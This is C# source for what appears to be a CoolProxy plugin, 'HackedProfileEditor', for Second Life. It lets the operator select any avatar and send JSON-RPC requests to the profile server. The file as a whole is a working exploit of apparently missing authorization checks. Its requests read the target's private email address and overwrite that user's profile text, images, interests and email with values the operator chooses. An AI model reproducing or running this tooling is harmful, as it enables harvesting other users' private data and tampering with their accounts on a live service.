using OpenMetaverse;
using OpenMetaverse.StructuredData;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CoolProxy.Plugins.HackedProfileEditor
{
    public partial class HackedProfileEditor : Form
    {
        // {"jsonrpc":"2.0","id":"2c9848f0-1315-41b5-9f37-3f5474a9d2fc","method":"user_preferences_request","params":{"UserId":"d4a8d1a0-819a-4119-9352-0d2069b8820d"}}

        private CoolProxyFrame Proxy;
        private UUID AvatarID = UUID.Zero;

        public HackedProfileEditor(CoolProxyFrame frame)
        {
            InitializeComponent();

            Proxy = frame;
        }
        
        private void FetchProperties()
        {
            OSDMap param = new OSDMap();
            param["UserId"] = AvatarID;

            OSDMap request = new OSDMap();
            request["jsonrpc"] = "2.0";
            request["method"] = "avatar_properties_request";
            request["params"] = param;

            try
            {
                string request_str = OSDParser.SerializeJsonString(request);

                WebClient webClient = new WebClient();
                webClient.Headers["content-type"] = "application/json-rpc";
                webClient.UploadStringCompleted += (x, y) =>
                {
                    OSDMap blarg = (OSDMap)OSDParser.DeserializeJson(y.Result);
                    OSDMap result = (OSDMap)blarg["result"];

                    // properties
                    textBox5.Text = result.ContainsKey("ImageId") ? result["ImageId"].ToString() : "";
                    textBox6.Text = result.ContainsKey("AboutText") ? result["AboutText"].ToString() : "";
                    textBox8.Text = result.ContainsKey("WebUrl") ? result["WebUrl"].ToString() : "";
                    textBox10.Text = result.ContainsKey("FirstLifeImageId") ? result["FirstLifeImageId"].ToString() : "";
                    textBox11.Text = result.ContainsKey("FirstLifeText") ? result["FirstLifeText"].ToString() : "";

                    // interests
                    textBox9.Text = result.ContainsKey("WantToText") ? result["WantToText"].ToString() : "";
                    textBox12.Text = result.ContainsKey("SkillsText") ? result["SkillsText"].ToString() : "";
                    textBox13.Text = result.ContainsKey("Language") ? result["Language"].ToString() : "";

                    WantsTo wants = result.ContainsKey("WantToMask") ? (WantsTo)result["WantToMask"].AsInteger() : WantsTo.Nothing;

                    checkBox3.Checked = wants.HasFlag(WantsTo.Build);
                    checkBox4.Checked = wants.HasFlag(WantsTo.Explore);
                    checkBox5.Checked = wants.HasFlag(WantsTo.Meet);
                    checkBox6.Checked = wants.HasFlag(WantsTo.BeHired);
                    checkBox10.Checked = wants.HasFlag(WantsTo.Group);
                    checkBox9.Checked = wants.HasFlag(WantsTo.Buy);
                    checkBox8.Checked = wants.HasFlag(WantsTo.Sell);
                    checkBox7.Checked = wants.HasFlag(WantsTo.Hire);

                    Skills skills = result.ContainsKey("SkillsMask") ? (Skills)result["SkillsMask"].AsInteger() : Skills.Nothing;

                    checkBox11.Checked = skills.HasFlag(Skills.Textures);
                    checkBox12.Checked = skills.HasFlag(Skills.Architecture);
                    checkBox13.Checked = skills.HasFlag(Skills.EventPlanning);
                    checkBox14.Checked = skills.HasFlag(Skills.Modeling);
                    checkBox15.Checked = skills.HasFlag(Skills.Scripting);
                    checkBox16.Checked = skills.HasFlag(Skills.CustomCharacters);
                };

                string target_uri = Proxy.Network.CurrentSim.ProfileServerURI;

                webClient.UploadStringAsync(new Uri(target_uri), "POST", request_str);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        void FetchPreferences()
        {
            OSDMap param = new OSDMap();
            param["UserId"] = AvatarID;

            OSDMap request = new OSDMap();
            request["jsonrpc"] = "2.0";
            request["method"] = "user_preferences_request";
            request["params"] = param;

            try
            {
                string request_str = OSDParser.SerializeJsonString(request);

                WebClient webClient = new WebClient();
                webClient.Headers["content-type"] = "application/json-rpc";
                webClient.UploadStringCompleted += (x, y) =>
                {
                    OSD v = OSDParser.DeserializeJson(y.Result);
                    OSDMap blarg = (OSDMap)v;
                    OSDMap result = (OSDMap)blarg["result"];
                    if (result.ContainsKey("EMail"))
                    {
                        textBox1.Text = result["EMail"].ToString();
                    }
                };

                string target_uri = Proxy.Network.CurrentSim.ProfileServerURI;

                webClient.UploadStringAsync(new Uri(target_uri), "POST", request_str);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            AvatarPickerSearchForm avatarPickerSearch = new AvatarPickerSearchForm();
            avatarPickerSearch.StartPosition = FormStartPosition.Manual;
            avatarPickerSearch.Location = new Point(this.Location.X + this.Width, this.Location.Y);

            if (avatarPickerSearch.ShowDialog() == DialogResult.OK)
            {
                AvatarID = avatarPickerSearch.SelectedID;
                textBox4.Text = AvatarID.ToString();
                textBox3.Text = avatarPickerSearch.SelectedName;


                FetchProperties();
                FetchPreferences();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OSDMap param = new OSDMap();
            param["UserId"] = AvatarID;
            param["EMail"] = textBox1.Text;

            OSDMap request = new OSDMap();
            request["jsonrpc"] = "2.0";
            request["method"] = "user_preferences_update";
            request["params"] = param;

            string request_str = OSDParser.SerializeJsonString(request);

            WebClient webClient = new WebClient();
            webClient.Headers["content-type"] = "application/json-rpc";
            webClient.UploadStringCompleted += (x, y) =>
            {
                OSDMap blarg = (OSDMap)OSDParser.DeserializeJson(y.Result);
            };

            string target_uri = Proxy.Network.CurrentSim.ProfileServerURI;

            webClient.UploadStringAsync(new Uri(target_uri), "POST", request_str);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            OSDMap param = new OSDMap();
            param["UserId"] = AvatarID;
            param["ImageId"] = textBox5.Text;
            param["AboutText"] = textBox6.Text;
            param["WebUrl"] = textBox8.Text;
            param["FirstLifeImageId"] = textBox10.Text;
            param["FirstLifeText"] = textBox11.Text;

            OSDMap request = new OSDMap();
            request["jsonrpc"] = "2.0";
            request["method"] = "avatar_properties_update";
            request["params"] = param;

            string request_str = OSDParser.SerializeJsonString(request);

            WebClient webClient = new WebClient();
            webClient.Headers["content-type"] = "application/json-rpc";
            webClient.UploadStringCompleted += (x, y) =>
            {
                OSDMap blarg = (OSDMap)OSDParser.DeserializeJson(y.Result);
            };

            string target_uri = Proxy.Network.CurrentSim.ProfileServerURI;

            webClient.UploadStringAsync(new Uri(target_uri), "POST", request_str);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            WantsTo wants = WantsTo.Nothing;
            if (checkBox3.Checked) wants |= WantsTo.Build;
            if (checkBox4.Checked) wants |= WantsTo.Explore;
            if (checkBox5.Checked) wants |= WantsTo.Meet;
            if (checkBox6.Checked) wants |= WantsTo.BeHired;
            if (checkBox10.Checked) wants |= WantsTo.Group;
            if (checkBox9.Checked) wants |= WantsTo.Buy;
            if (checkBox8.Checked) wants |= WantsTo.Sell;
            if (checkBox7.Checked) wants |= WantsTo.Hire;

            Skills skills = Skills.Nothing;
            if (checkBox11.Checked) skills |= Skills.Textures;
            if (checkBox12.Checked) skills |= Skills.Architecture;
            if (checkBox13.Checked) skills |= Skills.EventPlanning;
            if (checkBox14.Checked) skills |= Skills.Modeling;
            if (checkBox15.Checked) skills |= Skills.Scripting;
            if (checkBox16.Checked) skills |= Skills.CustomCharacters;


            OSDMap param = new OSDMap();
            param["UserId"] = AvatarID;
            param["WantToText"] = textBox9.Text;
            param["SkillsText"] = textBox12.Text;
            param["WantToMask"] = (int)wants;
            param["SkillsMask"] = (int)skills;
            param["Language"] = textBox13.Text;

            OSDMap request = new OSDMap();
            request["jsonrpc"] = "2.0";
            request["method"] = "avatar_interests_update";
            request["params"] = param;

            string request_str = OSDParser.SerializeJsonString(request);

            WebClient webClient = new WebClient();
            webClient.Headers["content-type"] = "application/json-rpc";
            webClient.UploadStringCompleted += (x, y) =>
            {
                OSDMap blarg = (OSDMap)OSDParser.DeserializeJson(y.Result);
            };

            string target_uri = Proxy.Network.CurrentSim.ProfileServerURI;

            webClient.UploadStringAsync(new Uri(target_uri), "POST", request_str);
        }
    }

    public enum WantsTo
    {
        Nothing = 0,
        Build = 1,
        Explore = 2,
        Meet = 4,
        Group = 8,
        Buy = 16,
        Sell = 32,
        BeHired = 64,
        Hire = 128
    };

    public enum Skills
    {
        Nothing = 0,
        Textures = 1,
        Architecture = 2,
        EventPlanning = 4,
        Modeling = 8,
        Scripting = 16,
        CustomCharacters = 32
    };
}
